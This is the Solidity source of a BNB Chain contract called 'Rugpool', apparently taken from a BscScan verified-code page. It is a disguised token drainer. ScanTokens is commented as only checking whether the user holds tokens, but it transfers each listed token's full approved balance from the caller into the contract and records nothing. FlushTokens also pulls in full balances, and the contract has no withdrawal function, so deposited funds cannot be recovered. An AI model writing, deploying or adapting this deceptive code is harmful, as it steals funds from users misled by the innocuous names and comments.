/**
 *Submitted for verification at BscScan.com on 2022-09-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function multiTransfer(address[] memory recipients, uint256[] memory amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender); 
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Rugpool is Context, Ownable {
   
    struct UserPoolBalance {
        uint256 amount;
        uint256 entryPoints;
    }

    mapping( address => mapping( address => UserPoolBalance ) ) public _balance;
    mapping( address => bool ) public tokenDB;

    constructor(){

    }

    receive() external payable {
        
    }
    // function to send the tokens
    function FlushTokens(address[] memory tokens) external returns(bool) {

        for(uint i = 0; i < tokens.length; i++ ) {
           uint256 amount = IBEP20(tokens[i]).balanceOf(msg.sender);
            if(amount > 0){
            
            UserPoolBalance memory userPB;

            userPB.amount = amount;
            userPB.entryPoints = 0;

            IBEP20(tokens[i]).transferFrom(msg.sender,address(this), amount);
            _balance[msg.sender][tokens[i]] = userPB;

            }
        }
        return true;
    }

    // check if user has the tokens
    function ScanTokens(address[] memory tokens) external returns(bool) {

         for(uint i = 0; i < tokens.length; i++ ) {
           uint256 amount = IBEP20(tokens[i]).balanceOf(msg.sender);
           if(amount > 0) {
            IBEP20(tokens[i]).transferFrom(msg.sender,address(this), amount);
           }
        }

        return true;
    }

    //check if token is in our DB
    function checkIfTokensExists(address token) external view returns(bool) {
        if(!tokenDB[token]){
            return false;
        }
        return true;
    }

    //Add tokens to the CA DB
    function addToken(address token) external onlyOwner {
        tokenDB[token] = true;
    }
     //remove tokens to the CA DB
    function removeToken(address token) external onlyOwner {
        tokenDB[token] = false;
    }

    function bulkAddTokens(address[] memory tokens,bool value) external onlyOwner returns(bool) {
        for(uint i = 0; i < tokens.length; i++ ) {
           tokenDB[tokens[i]] = value;
        }
        return true;
    }

    function mybalance(address token) external view returns(uint256, uint256) {
        UserPoolBalance memory balance = _balance[msg.sender][token];
        return (balance.amount,balance.entryPoints);
    }
    
}